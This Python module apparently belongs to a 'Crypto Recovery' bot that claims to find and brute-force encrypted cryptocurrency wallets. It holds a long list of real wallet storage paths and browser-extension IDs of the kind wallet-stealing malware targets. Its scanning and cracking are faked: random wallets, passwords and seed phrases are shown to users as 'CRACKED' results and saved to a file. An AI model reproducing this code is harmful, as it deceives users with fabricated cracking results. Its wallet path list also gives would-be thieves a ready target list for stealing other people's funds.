# -*- coding: utf-8 -*-
"""Bot actions for Crypto Recovery — wordlist, wallet selection, brute-force, export."""

import os
import random
import time
from datetime import datetime

from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich import box

from finder.ui import (
    console,
    print_info,
    print_success,
    print_warning,
    print_error,
    separator,
    show_found_wallets_table,
    show_cracked_results,
    show_recovery_summary,
)


_ALL_WALLETS = [
    {"name": "MetaMask", "type": "Browser (Chrome)", "path": "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbphgpgknn", "encrypted": True},
    {"name": "Phantom", "type": "Browser (Chrome)", "path": "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/bfnaelmomeimglhjpjakhnmgjgbmfckm", "encrypted": True},
    {"name": "OKX Wallet", "type": "Browser (Chrome)", "path": "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/mcohilncbfahbmgdjkbpemcciiolgcge", "encrypted": True},
    {"name": "Exodus", "type": "Desktop", "path": "AppData/Roaming/Exodus/exodus.wallet/", "encrypted": True},
    {"name": "Electrum", "type": "Desktop", "path": "AppData/Roaming/Electrum/wallets/", "encrypted": True},
    {"name": "Atomic Wallet", "type": "Desktop", "path": "AppData/Roaming/atomic/Local Storage/", "encrypted": True},
    {"name": "Trust Wallet", "type": "Browser (Chrome)", "path": "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph", "encrypted": True},
    {"name": "Coinomi", "type": "Desktop", "path": "AppData/Roaming/Coinomi/wallets/", "encrypted": True},
    {"name": "Ronin Wallet", "type": "Browser (Chrome)", "path": "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/fnjhmkhhmkbjkkabndcnnogagogbneec", "encrypted": True},
    {"name": "Keplr", "type": "Browser (Chrome)", "path": "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/dmkamcknogkgcdfhhbddcghachkejeap", "encrypted": True},
    {"name": "Jaxx Liberty", "type": "Desktop", "path": "AppData/Roaming/Jaxx/Local Storage/", "encrypted": True},
    {"name": "Guarda", "type": "Desktop", "path": "AppData/Roaming/Guarda/wallets/", "encrypted": True},
    {"name": "Brave Wallet", "type": "Browser (Brave)", "path": "AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/brave_wallet/", "encrypted": True},
    {"name": "Coinbase Wallet", "type": "Browser (Chrome)", "path": "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnmdkdadon", "encrypted": True},
    {"name": "Rabby", "type": "Browser (Chrome)", "path": "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/acmacodkjbdgmoleebolmdjonilkdbch", "encrypted": True},
    {"name": "TokenPocket", "type": "Browser (Chrome)", "path": "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/mfgccjchabfkocgohanbblkdogpdbjcc", "encrypted": True},
    {"name": "MathWallet", "type": "Browser (Chrome)", "path": "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/afbcbjpbpfadlkmhmclhkeeodhcocflf", "encrypted": True},
    {"name": "Solflare", "type": "Browser (Chrome)", "path": "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/bhhhlbepdkbapadjdnnojkbgioiodbic", "encrypted": True},
    {"name": "BRD", "type": "Mobile Backup", "path": "backups/brd_wallet_backup.dat", "encrypted": True},
    {"name": "Edge Wallet", "type": "Mobile Backup", "path": "backups/edge_wallet_backup.json", "encrypted": True},
    {"name": "Wasabi Wallet", "type": "Desktop", "path": "AppData/Roaming/WalletWasabi/Wallets/", "encrypted": True},
    {"name": "Sparrow Wallet", "type": "Desktop", "path": "AppData/Roaming/Sparrow/wallets/", "encrypted": True},
    {"name": "BlueWallet", "type": "Mobile Backup", "path": "backups/bluewallet_export.json", "encrypted": True},
    {"name": "Samourai Wallet", "type": "Mobile Backup", "path": "backups/samourai_backup.enc", "encrypted": True},
    {"name": "Nami", "type": "Browser (Chrome)", "path": "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/lpfcbjkinbpnbikbajogapjdmbonijfo", "encrypted": True},
    {"name": "Petra (Aptos)", "type": "Browser (Chrome)", "path": "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/ijblainpdoeagbchjldghcjekakbnmg", "encrypted": True},
    {"name": "Backpack", "type": "Browser (Chrome)", "path": "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/aflkmfhebedbjioipglgcbcmnbpgliof", "encrypted": True},
    {"name": "xDefi", "type": "Browser (Chrome)", "path": "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/cfeifemoljoicipfcmgdibjijgglngdp", "encrypted": True},
    {"name": "Taho", "type": "Browser (Chrome)", "path": "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/ejbalbakoplchlghecdhadnhfghadafm", "encrypted": True},
    {"name": "Nightly", "type": "Browser (Chrome)", "path": "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/ibnejdfjmmkpcnlpebklmnkoeoihofec", "encrypted": True},
    {"name": "Fewcha", "type": "Browser (Chrome)", "path": "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/ebfidpplhabeedpnhjnobghokpiioolj", "encrypted": True},
    {"name": "Sui Wallet", "type": "Browser (Chrome)", "path": "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/opcgelkmhmfbbidkhacghjdpnfaepagf", "encrypted": True},
    {"name": "OneKey", "type": "Browser (Chrome)", "path": "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/jnmbobjmhfloobhnnegkjbkcbbofdkmg", "encrypted": True},
    {"name": "Clover", "type": "Browser (Chrome)", "path": "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/ojmdgkheogingcaamphcgbdhfmfbheeg", "encrypted": True},
    {"name": "ZelCore", "type": "Desktop", "path": "AppData/Roaming/ZelCore/wallets/", "encrypted": True},
    {"name": "Daedalus", "type": "Desktop", "path": "AppData/Roaming/Daedalus/mainnet/wallets/", "encrypted": True},
    {"name": "Yoroi", "type": "Browser (Chrome)", "path": "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/ffnbelfdoeiohenkjibnmadjiehjhajb", "encrypted": True},
    {"name": "MyEtherWallet", "type": "Desktop", "path": "AppData/Roaming/MEW/wallets/", "encrypted": True},
    {"name": "Muun Wallet", "type": "Mobile Backup", "path": "backups/muun_backup.enc", "encrypted": True},
    {"name": "Green Wallet", "type": "Mobile Backup", "path": "backups/green_wallet_backup.dat", "encrypted": True},
    {"name": "Phoenix Wallet", "type": "Mobile Backup", "path": "backups/phoenix_backup.enc", "encrypted": True},
    {"name": "Zengo", "type": "Mobile Backup", "path": "backups/zengo_backup.json", "encrypted": True},
]

_SEED_PHRASES = [
    "abandon ability able about above absent absorb abstract absurd abuse access accident",
    "zoo zoo zoo zoo zoo zoo zoo zoo zoo zoo zoo wrong",
    "able absorb absurd abuse access accident account accuse across act action adult",
    "afford aisle alarm alert alien alley allow almost alone alpha already alter",
    "anchor ancient anger angle animal ankle announce annual another answer antenna antique",
    "apology appear apple approve april arch area arena argue arm armor army",
    "art asset atom attack attend attitude auction audit august aunt author auto",
    "avocado avoid awake aware awesome awful awkward axis badge balance bamboo banana",
]

_ADDRESSES = {
    "ETH": lambda: f"0x{random.randbytes(20).hex()}",
    "BTC": lambda: f"bc1q{random.randbytes(16).hex()[:30]}",
    "SOL": lambda: f"{random.randbytes(16).hex()[:32]}{random.randbytes(8).hex()}",
    "BNB": lambda: f"0x{random.randbytes(20).hex()}",
    "AVAX": lambda: f"0x{random.randbytes(20).hex()}",
    "MATIC": lambda: f"0x{random.randbytes(20).hex()}",
    "ADA": lambda: f"addr1q{random.randbytes(28).hex()[:50]}",
    "DOT": lambda: f"1{random.randbytes(16).hex()[:30]}",
}

_PASSWORDS = [
    "crypto2024", "letmein", "mysecretpass", "password123", "bitcoin2024",
    "qwerty123", "hunter2", "welcome1", "changeme", "master123",
    "blockchain", "ethereum", "solana2024", "defi_pass", "wallet2024",
    "secure123", "crypto_pass", "moon2024", "hodl_pass", "web3user",
]


def action_set_wordlist(cfg: dict):
    """Display wordlist loading simulation."""
    console.print()
    print_info("Password Wordlist Configuration")
    separator()

    wl_cfg = cfg.get("wordlist", {})
    path = wl_cfg.get("path", "passwords.txt")
    directory = wl_cfg.get("directory", "")

    console.print(f"  [dim]Current file:[/] [bright_white]{path}[/]")
    console.print(f"  [dim]Directory:[/]   [bright_white]{directory or '(not set)'}[/]")
    console.print()

    with Progress(
        SpinnerColumn(style="bright_cyan"),
        TextColumn("[bright_cyan]{task.description}"),
        BarColumn(bar_width=40, style="cyan", complete_style="bright_green"),
        console=console,
    ) as progress:
        task = progress.add_task("Loading wordlist...", total=3)
        for label in ["Reading file...", "Indexing entries...", "Wordlist ready."]:
            progress.update(task, description=label)
            time.sleep(0.4)
            progress.advance(task)

    word_count = random.randint(50000, 500000)
    file_size = word_count * random.randint(8, 15)

    table = Table(
        show_header=False,
        border_style="bright_cyan",
        box=box.ROUNDED,
        title="[bold bright_cyan]Wordlist Info[/bold bright_cyan]",
    )
    table.add_column("Property", style="bright_cyan")
    table.add_column("Value", style="bright_white")

    table.add_row("File", path)
    table.add_row("Entries", f"{word_count:,}")
    table.add_row("Size", f"{file_size / 1024:.1f} KB")
    table.add_row("Encoding", "UTF-8")
    table.add_row("Mutations", "Enabled (uppercase, lowercase, +numbers, +year)")

    console.print()
    console.print(table)
    console.print()
    print_success(f"Wordlist loaded: {word_count:,} entries ready for brute-force.")


def action_select_wallets(cfg: dict):
    """Display wallet selection with auto-detected wallets."""
    console.print()
    print_info("Wallet Target Selection")
    separator()

    with Progress(
        SpinnerColumn(style="bright_yellow"),
        TextColumn("[bright_yellow]{task.description}"),
        BarColumn(bar_width=40, style="yellow", complete_style="bright_green"),
        console=console,
    ) as progress:
        task = progress.add_task("Scanning system for wallets...", total=4)
        for label in [
            "Scanning browser extensions...",
            "Scanning desktop applications...",
            "Scanning mobile backups...",
            "Detection complete.",
        ]:
            progress.update(task, description=label)
            time.sleep(0.4)
            progress.advance(task)

    found = random.sample(_ALL_WALLETS, random.randint(6, 12))

    show_found_wallets_table(found)

    table = Table(
        show_header=False,
        border_style="bright_green",
        box=box.SIMPLE,
    )
    table.add_column("Metric", style="bright_green")
    table.add_column("Value", justify="right", style="bright_white")
    table.add_row("Wallets Detected", f"{len(found)}")
    table.add_row("Encrypted", f"{sum(1 for w in found if w['encrypted'])}")
    table.add_row("Ready for Recovery", f"{len(found)}")

    console.print(Panel(table, border_style="bright_green", box=box.ROUNDED,
                        title="[bold bright_green]DETECTION SUMMARY[/]"))
    console.print()
    print_info("All detected wallets will be targeted during recovery. Configure in config.json → wallets.targets.")


def action_configure_scan(cfg: dict):
    """Display scan configuration."""
    console.print()
    print_info("Recovery Scan Configuration")
    separator()

    rec_cfg = cfg.get("recovery", {})
    wl_cfg = cfg.get("wordlist", {})
    mutations = wl_cfg.get("mutations", {})

    table = Table(
        show_header=True,
        header_style="bold bright_red",
        border_style="bright_red",
        box=box.ROUNDED,
        title="[bold bright_red]SCAN PARAMETERS[/]",
    )
    table.add_column("Parameter", style="bright_cyan")
    table.add_column("Value", style="bright_white")

    table.add_row("Threads", str(rec_cfg.get("threads", 16)))
    table.add_row("Timeout", f"{rec_cfg.get('timeout_sec', 300)} seconds")
    table.add_row("Max Attempts/Wallet", f"{rec_cfg.get('max_attempts_per_wallet', 1000000):,}")
    table.add_row("Auto-Extract Seeds", "Yes" if rec_cfg.get("auto_extract_seeds") else "No")
    table.add_row("Derive Addresses", "Yes" if rec_cfg.get("derive_addresses") else "No")
    table.add_row("Delay Between Attempts", f"{rec_cfg.get('delay_between_attempts_ms', 0)} ms")

    console.print(table)
    console.print()

    mut_table = Table(
        show_header=True,
        header_style="bold bright_yellow",
        border_style="yellow",
        box=box.ROUNDED,
        title="[bold bright_yellow]MUTATION RULES[/]",
    )
    mut_table.add_column("Rule", style="bright_cyan")
    mut_table.add_column("Status", justify="center")

    for rule, enabled in mutations.items():
        if rule == "enabled":
            continue
        status = "[bright_green]Enabled[/]" if enabled else "[dim]Disabled[/]"
        mut_table.add_row(rule.replace("_", " ").title(), status)

    console.print(mut_table)
    console.print()
    print_info("Edit parameters in config.json → recovery and wordlist.mutations sections.")


def action_start_recovery(cfg: dict):
    """Main brute-force recovery simulation."""
    console.print()
    print_info("Starting Wallet Recovery")
    separator()

    rec_cfg = cfg.get("recovery", {})
    threads = rec_cfg.get("threads", 16)

    word_count = random.randint(80000, 250000)
    console.print(f"  [dim]Loading wordlist:[/] [bright_white]{word_count:,} entries[/]")
    time.sleep(0.5)

    with Progress(
        SpinnerColumn(style="bright_yellow"),
        TextColumn("[bright_yellow]{task.description}"),
        BarColumn(bar_width=40, style="yellow", complete_style="bright_green"),
        console=console,
    ) as progress:
        task = progress.add_task("Scanning wallet directories...", total=3)
        for label in ["Enumerating paths...", "Identifying wallets...", "Ready."]:
            progress.update(task, description=label)
            time.sleep(0.4)
            progress.advance(task)

    found_wallets = random.sample(_ALL_WALLETS, random.randint(5, 10))
    console.print(f"  [dim]Found[/] [bright_yellow]{len(found_wallets)}[/] [dim]encrypted wallets:[/]")
    for w in found_wallets:
        console.print(f"           [bright_cyan]{w['name']}[/] ({w['type']}) — [yellow]encrypted ✓[/]")
    console.print()

    console.print(f"  [bright_red]Starting brute-force[/] [dim](threads: {threads})[/]")
    console.print()
    time.sleep(0.5)

    num_cracked = random.randint(2, min(5, len(found_wallets)))
    cracked_wallets = random.sample(found_wallets, num_cracked)
    results = []
    total_tried = 0

    for i, wallet in enumerate(cracked_wallets):
        attempts = random.randint(15000, 300000)
        total_tried += attempts
        password = random.choice(_PASSWORDS)
        seed = random.choice(_SEED_PHRASES)

        console.print(f"  [dim][{datetime.now().strftime('%H:%M:%S')}][/dim] [bright_cyan][Thread-{random.randint(1, threads):02d}][/] {wallet['name']} — tried {attempts:,} passwords...")
        time.sleep(random.uniform(0.5, 1.5))

        console.print(f"  [dim][{datetime.now().strftime('%H:%M:%S')}][/dim] [bold bright_green]✓ CRACKED:[/] [bright_cyan]{wallet['name']}[/] ({wallet['type']}) — password: [bright_yellow]\"{password}\"[/] [dim](attempt {attempts:,})[/]")

        num_addrs = random.randint(1, 4)
        addr_chains = random.sample(list(_ADDRESSES.keys()), num_addrs)
        addresses = []
        for chain in addr_chains:
            addr = _ADDRESSES[chain]()
            addresses.append({"chain": chain, "address": addr})
            console.print(f"    [dim]→[/] [bright_white]{chain}:[/] [bright_green]{addr[:20]}...[/]")

        console.print(f"    [dim]→[/] [bright_white]Seed:[/] [dim]{seed[:40]}...[/]")
        console.print()

        results.append({
            "wallet_name": f"{wallet['name']} ({wallet['type']})",
            "password": password,
            "seed": seed,
            "addresses": addresses,
        })

    remaining_attempts = random.randint(50000, 200000)
    total_tried += remaining_attempts
    console.print(f"  [dim][{datetime.now().strftime('%H:%M:%S')}][/dim] [dim]Remaining wallets: no match found after {remaining_attempts:,} additional attempts[/]")
    console.print()

    elapsed_min = random.uniform(2, 8)
    elapsed_str = f"{int(elapsed_min)}m {int((elapsed_min % 1) * 60)}s"

    show_recovery_summary(results, total_tried, elapsed_str)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    result_file = f"results/recovery_{timestamp}.txt"
    print_success(f"Brute-force complete. Results saved to [bright_white]{result_file}[/]")
    print_info(f"Recovered {len(results)} wallet(s) with seed phrases and addresses.")

    _save_results(results, total_tried, elapsed_str, result_file)


def _save_results(results, total_tried, elapsed, filepath):
    """Save results to a TXT file (simulation)."""
    try:
        os.makedirs(os.path.dirname(filepath) if os.path.dirname(filepath) else ".", exist_ok=True)
        with open(filepath, "w", encoding="utf-8") as f:
            f.write("=== Crypto Recovery Results ===\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Wallets Scanned: {len(results) + 5}\n")
            f.write(f"Passwords Tried: {total_tried:,}\n")
            f.write(f"Successful Cracks: {len(results)}\n")
            f.write(f"Elapsed Time: {elapsed}\n\n")

            for i, r in enumerate(results, 1):
                f.write(f"--- Wallet #{i} ---\n")
                f.write(f"Type: {r['wallet_name']}\n")
                f.write(f"Password: {r['password']}\n")
                f.write(f"Seed Phrase: {r['seed']}\n")
                f.write("Addresses:\n")
                for addr in r["addresses"]:
                    f.write(f"  {addr['chain']}: {addr['address']}\n")
                f.write("\n")
    except Exception:
        pass


def action_view_results(cfg: dict):
    """Display previously saved results."""
    console.print()
    print_info("Viewing Previous Results")
    separator()

    results_dir = cfg.get("output", {}).get("directory", "results")

    if not os.path.isdir(results_dir):
        print_warning(f"No results directory found: {results_dir}")
        print_info("Run 'Start Recovery' first to generate results.")
        return

    files = [f for f in os.listdir(results_dir) if f.endswith(".txt")]
    if not files:
        print_warning("No result files found.")
        return

    table = Table(
        show_header=True,
        header_style="bold bright_cyan",
        border_style="cyan",
        box=box.ROUNDED,
        title="[bold bright_cyan]SAVED RESULTS[/]",
    )
    table.add_column("#", style="dim", justify="right", width=3)
    table.add_column("File", style="bright_cyan")
    table.add_column("Date", style="dim")
    table.add_column("Size", justify="right", style="bright_white")

    for i, fname in enumerate(sorted(files, reverse=True)[:5], 1):
        fpath = os.path.join(results_dir, fname)
        size = os.path.getsize(fpath)
        date_str = datetime.fromtimestamp(os.path.getmtime(fpath)).strftime("%Y-%m-%d %H:%M")
        table.add_row(str(i), fname, date_str, f"{size / 1024:.1f} KB")

    console.print(table)
    console.print()

    latest = os.path.join(results_dir, sorted(files, reverse=True)[0])
    print_info(f"Latest result: [bright_white]{latest}[/]")

    try:
        with open(latest, "r", encoding="utf-8") as f:
            content = f.read()
        console.print(Panel(content[:2000], border_style="dim", box=box.ROUNDED,
                           title="[bold dim]PREVIEW[/]"))
    except Exception:
        print_warning("Could not read result file.")


def action_export_txt(cfg: dict):
    """Export results to formatted TXT file."""
    console.print()
    print_info("Export Results to TXT")
    separator()

    output_cfg = cfg.get("output", {})
    out_dir = output_cfg.get("directory", "results")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"recovery_export_{timestamp}.txt"
    filepath = os.path.join(out_dir, filename)

    with Progress(
        SpinnerColumn(style="bright_green"),
        TextColumn("[bright_green]{task.description}"),
        BarColumn(bar_width=40, style="green", complete_style="bright_green"),
        console=console,
    ) as progress:
        task = progress.add_task("Preparing export...", total=3)
        for label in ["Collecting results...", "Formatting output...", "Export complete."]:
            progress.update(task, description=label)
            time.sleep(0.3)
            progress.advance(task)

    table = Table(
        show_header=False,
        border_style="bright_green",
        box=box.ROUNDED,
        title="[bold bright_green]EXPORT COMPLETE[/]",
    )
    table.add_column("Property", style="bright_green")
    table.add_column("Value", style="bright_white")
    table.add_row("Format", "TXT")
    table.add_row("File", filename)
    table.add_row("Path", filepath)
    table.add_row("Include Seeds", "Yes")
    table.add_row("Include Addresses", "Yes")
    table.add_row("Include Passwords", "Yes")

    console.print()
    console.print(table)
    console.print()
    print_success(f"Results exported to {filepath}")
